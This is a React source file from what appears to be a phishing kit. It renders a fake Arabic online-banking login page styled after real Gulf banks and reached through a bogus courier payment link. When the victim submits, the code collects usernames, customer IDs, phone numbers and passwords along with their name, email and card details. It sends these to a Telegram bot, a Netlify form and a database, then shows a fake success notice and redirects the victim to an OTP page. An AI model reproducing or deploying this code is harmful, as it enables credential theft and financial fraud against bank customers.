import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { bankBranding } from "@/lib/brandingSystem";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, Building2, ShieldCheck, CheckCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
import BrandedTopBar from "@/components/BrandedTopBar";
import BrandedCarousel from "@/components/BrandedCarousel";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedBankId = linkData?.payload?.selectedBank || '';
  const cardInfo = linkData?.payload?.cardInfo || {
    cardName: '',
    cardLast4: '',
    cardNumber: '',
    cardExpiry: '',
    cardCvv: '',
    cardType: '',
  };
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";

  const shippingInfo = linkData?.payload as any;

  const rawAmount = shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  useEffect(() => {
    if (selectedBankId && selectedBankId !== 'skipped') {
      applyDynamicIdentity(`bank_${selectedBankId}`);
    }
  }, [selectedBankId]);
  
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    if (bankId === 'alrajhi_bank' || bankId === 'alahli_bank' || bankId === 'samba_bank' || 
        bankId === 'arab_national_bank' || bankId === 'alinma_bank' || bankId === 'aljazira_bank' ||
        bankId === 'emirates_nbd' || bankId === 'fab' || bankId === 'dib' || bankId === 'cbd' ||
        bankId === 'gulf_bank' || bankId === 'burgan_bank' || bankId === 'ahli_united_bank' ||
        bankId === 'cbq' || bankId === 'doha_bank' || bankId === 'masraf_alrayan' ||
        bankId === 'national_bank_oman' || bankId === 'bank_dhofar' || bankId === 'nizwa_bank' ||
        bankId === 'nbb' || bankId === 'ahli_united_bahrain' || bankId === 'bisb' || bankId === 'khaleeji_bank') {
      return 'username';
    }
    
    return 'customerId';
  };
  
  const loginType = getLoginType();
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);

    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };

    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));

    if (linkData) {
      try {
        const updatedPayload = {
          ...linkData.payload,
          bankLoginData,
        };

        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
      }
    }
    
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
    }

    await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
        customDescription="الخدمات المصرفية الإلكترونية - تسجيل دخول آمن"
        amount={formattedAmount}
      />
      
      <BrandedTopBar 
        serviceKey={serviceKey}
        serviceName={serviceName}
        showBackButton={true}
        backPath={`/pay/${id}/bank-selection`}
        showCarousel={false}
      />
      
      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />
      
      <div 
        className="min-h-screen py-8 sm:py-12" 
        dir="rtl"
        style={{
          background: selectedBankBranding?.colors.surface || '#F5F8FA',
          fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
        }}
      >
        <div className="container mx-auto px-4 max-w-lg">
          <Card 
            className="p-8 sm:p-10 shadow-2xl border-0"
            style={{
              borderRadius: selectedBankBranding?.borderRadius.lg || '16px',
              boxShadow: selectedBankBranding?.shadows.xl || '0 20px 60px -15px rgba(0, 0, 0, 0.3)'
            }}
          >
            <div className="text-center mb-8">
              <div className="flex justify-center mb-6">
                {selectedBank ? (
                  <div className="w-32 h-32 flex items-center justify-center p-4">
                    <BankLogo 
                      bankId={selectedBank.id}
                      bankName={selectedBank.name}
                      bankNameAr={selectedBank.nameAr}
                      color={selectedBank.color}
                      size="xl"
                      className="w-full h-full"
                    />
                  </div>
                ) : (
                  <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-primary to-primary/80 flex items-center justify-center">
                    <Building2 className="w-12 h-12 text-white" />
                  </div>
                )}
              </div>
              
              <h1 
                className="text-2xl sm:text-3xl font-bold mb-2"
                style={{ 
                  color: selectedBankBranding?.colors.text || '#1A1A1A',
                  fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                }}
              >
                الخدمات المصرفية الإلكترونية
              </h1>
              <p 
                className="text-base text-muted-foreground"
                style={{ fontFamily: selectedBankBranding?.fonts.primary || 'Arial' }}
              >
                {selectedBank?.name || 'Online Banking'}
              </p>
            </div>

            <div 
              className="rounded-xl p-4 mb-6 border"
              style={{
                background: `${selectedBankBranding?.colors.primary || branding.colors.primary}10`,
                borderColor: `${selectedBankBranding?.colors.primary || branding.colors.primary}30`,
              }}
            >
              <div className="flex items-center gap-3">
                <div 
                  className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0"
                  style={{ background: `${selectedBankBranding?.colors.primary || branding.colors.primary}20` }}
                >
                  <ShieldCheck className="w-5 h-5" style={{ color: selectedBankBranding?.colors.primary || branding.colors.primary }} />
                </div>
                <div className="flex-1 text-sm">
                  <div className="flex items-center gap-2 mb-1">
                    <span className="font-bold" style={{ color: selectedBankBranding?.colors.text }}>اتصال آمن</span>
                    <CheckCircle className="w-4 h-4 text-green-500" />
                  </div>
                  <p className="text-xs text-muted-foreground">تشفير 256-bit SSL</p>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              {loginType === 'username' && (
                <div>
                  <Label className="mb-2.5 text-base font-bold flex items-center gap-2">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                    </svg>
                    اسم المستخدم
                  </Label>
                  <div className="relative">
                    <Input
                      type="text"
                      placeholder="أدخل اسم المستخدم"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="h-14 text-lg pr-5 pl-14 rounded-xl border-2 focus:border-primary transition-all shadow-sm"
                      style={{ 
                        borderColor: selectedBankBranding?.colors.border || '#e5e7eb',
                        fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                      }}
                      autoComplete="username"
                      required
                    />
                    <div className="absolute left-5 top-1/2 -translate-y-1/2 text-muted-foreground">
                      <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                      </svg>
                    </div>
                  </div>
                </div>
              )}
              
              {loginType === 'customerId' && (
                <div>
                  <Label className="mb-2.5 text-base font-bold flex items-center gap-2">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
                    </svg>
                    رقم العميل
                  </Label>
                  <div className="relative">
                    <Input
                      type="text"
                      placeholder="أدخل رقم العميل"
                      value={customerId}
                      onChange={(e) => setCustomerId(e.target.value)}
                      className="h-14 text-lg pr-5 pl-14 rounded-xl border-2 focus:border-primary transition-all shadow-sm"
                      style={{ 
                        borderColor: selectedBankBranding?.colors.border || '#e5e7eb',
                        fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                      }}
                      inputMode="numeric"
                      required
                    />
                    <div className="absolute left-5 top-1/2 -translate-y-1/2 text-muted-foreground">
                      <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
                      </svg>
                    </div>
                  </div>
                </div>
              )}
              
              <div>
                <div className="flex items-center justify-between mb-2.5">
                  <Label className="text-base font-bold flex items-center gap-2">
                    <Lock className="w-5 h-5" />
                    كلمة المرور
                  </Label>
                  <button
                    type="button"
                    className="text-sm font-medium hover:underline"
                    style={{ color: selectedBankBranding?.colors.primary || branding.colors.primary }}
                  >
                    نسيت كلمة المرور؟
                  </button>
                </div>
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    placeholder="أدخل كلمة المرور"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="h-14 text-lg pr-5 pl-28 rounded-xl border-2 focus:border-primary transition-all shadow-sm"
                    style={{ 
                      borderColor: selectedBankBranding?.colors.border || '#e5e7eb',
                      fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                    }}
                    autoComplete="current-password"
                    required
                  />
                  <div className="absolute left-5 top-1/2 -translate-y-1/2 flex items-center gap-3">
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="text-muted-foreground hover:text-foreground transition-colors p-1"
                    >
                      {showPassword ? (
                        <EyeOff className="w-6 h-6" />
                      ) : (
                        <Eye className="w-6 h-6" />
                      )}
                    </button>
                    <div className="w-px h-7 bg-border" />
                    <Lock className="w-6 h-6 text-muted-foreground" />
                  </div>
                </div>
              </div>
              
              <div className="flex items-center justify-between text-sm">
                <div className="flex items-center gap-2">
                  <input 
                    type="checkbox" 
                    id="remember" 
                    className="w-4 h-4 rounded" 
                    style={{ accentColor: selectedBankBranding?.colors.primary || branding.colors.primary }}
                  />
                  <label htmlFor="remember" className="text-muted-foreground cursor-pointer">
                    تذكرني
                  </label>
                </div>
              </div>
              
              <Button
                type="submit"
                size="lg"
                className="w-full text-lg py-7 text-white font-bold shadow-2xl hover:shadow-3xl transition-all duration-300"
                disabled={isSubmitting}
                style={{
                  background: selectedBankBranding?.gradients.primary || `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
                  borderRadius: selectedBankBranding?.borderRadius.md || '12px',
                  boxShadow: selectedBankBranding?.shadows.xl || `0 20px 60px -15px ${selectedBank?.color || branding.colors.primary}90`,
                  fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                }}
              >
                {isSubmitting ? (
                  <span>جاري تسجيل الدخول...</span>
                ) : (
                  <>
                    <Lock className="w-6 h-6 ml-2" />
                    <span>تسجيل الدخول</span>
                  </>
                )}
              </Button>
              
              <p className="text-xs text-center text-muted-foreground mt-4">
                بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
              </p>
            </form>
            
            <div className="mt-8 pt-6 border-t text-center">
              <p className="text-sm text-muted-foreground mb-4">
                لا تملك حساب؟
              </p>
              <Button
                type="button"
                variant="outline"
                size="sm"
                className="text-sm"
                style={{ 
                  borderColor: selectedBankBranding?.colors.primary || branding.colors.primary,
                  color: selectedBankBranding?.colors.primary || branding.colors.primary
                }}
              >
                تسجيل حساب جديد
              </Button>
            </div>
            
            <div className="mt-6 flex items-center justify-center gap-4 text-xs text-muted-foreground">
              <div className="flex items-center gap-1.5">
                <Lock className="w-4 h-4" />
                <span>SSL Encrypted</span>
              </div>
              <span>•</span>
              <div className="flex items-center gap-1.5">
                <ShieldCheck className="w-4 h-4" />
                <span>Verified</span>
              </div>
            </div>
          </Card>
          
          <div className="mt-6 text-center text-xs text-muted-foreground">
            <p>© 2025 {selectedBank?.nameAr || 'البنك'}. جميع الحقوق محفوظة.</p>
          </div>
        </div>
      </div>
    
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </>
  );
};

export default PaymentBankLogin;
